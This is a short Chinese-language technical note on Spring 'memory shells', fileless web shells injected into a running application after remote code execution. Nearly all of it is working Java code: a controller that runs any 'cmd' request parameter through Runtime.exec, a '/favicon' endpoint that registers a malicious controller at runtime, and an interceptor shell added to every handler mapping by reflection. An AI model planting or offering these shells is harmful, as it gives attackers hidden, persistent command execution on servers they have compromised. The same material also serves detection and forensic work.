如果Spring没有加载Servlet加载不了jsp文件，只能利用RCE注入内存马

## 控制器内存马

```
package com.example.demo;  
  
import org.springframework.web.bind.annotation.RequestMapping;  
import org.springframework.web.bind.annotation.RestController;  
  
import javax.servlet.http.HttpServletRequest;  
import java.io.IOException;  
  
@RestController  
public class ControllerShell {  
    @RequestMapping("/test")  
    public void test(HttpServletRequest request) {  
        String cmd = request.getParameter("cmd");  
        if (cmd != null) {  
            try {  
                Runtime.getRuntime().exec(cmd);  
            } catch (IOException e) {  
                throw new RuntimeException(e);  
            }  
        }  
    }  
}
```


```  
@RestController  
public class ControllerShell {  

//注册内存马
    @RequestMapping("/favicon")  
    public void inject() throws NoSuchMethodException {  
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);  
        RequestMappingHandlerMapping bean = context.getBean(RequestMappingHandlerMapping.class);  
  
        RequestMappingInfo requestMappingInfo = new RequestMappingInfo(  
                new PatternsRequestCondition("/*"),  
                new RequestMethodsRequestCondition(),  
                null, null, null, null, null  
        );  
  
        bean.registerMapping(requestMappingInfo, new TestController(), TestController.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class));  
    }  

  //恶意控制器
    public class TestController {  
        public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {  
            String cmd = request.getParameter("cmd");  
            if(cmd != null) {  
                Runtime.getRuntime().exec(cmd);  
            }  
        }  
    }  
  
}
```

## 拦截器内存马

```
@RestController  
public class InterceptorShell {  
    @RequestMapping("/favicon")  
    public void favicon() throws Exception {  
        // 1. 获取上下文  
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()  
                .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);  
  
        // 2. 注意：拦截器是存在于 HandlerMapping 中的，而不是 HandlerAdapter        // 我们获取所有的 HandlerMapping Bean        String[] beanNames = context.getBeanNamesForType(AbstractHandlerMapping.class);  
  
        for (String beanName : beanNames) {  
            AbstractHandlerMapping mapping = (AbstractHandlerMapping) context.getBean(beanName);  
  
            // 3. 反射获取 adaptedInterceptors 字段  
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");  
            field.setAccessible(true);  
  
            // 4. 获取当前的拦截器列表  
            List<HandlerInterceptor> list = (List<HandlerInterceptor>) field.get(mapping);  
  
            // 5. 添加自定义拦截器（建议先检查是否已经添加过，防止重复注入）  
            list.add(new TestInterceptor());  
        }  
        System.out.println("Interceptor injected successfully into all mappings.");  
    }  
  
    // 内部类拦截器  
    public class TestInterceptor implements HandlerInterceptor {  
        @Override  
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {  
            String cmd = request.getParameter("cmd");  
            if (cmd != null && !cmd.isEmpty()) {  
                // 简单的执行，建议生产测试时使用带回显的方式  
                Runtime.getRuntime().exec(cmd);  
            }  
            return true; // 继续后续流程  
        }  
    }  
}
```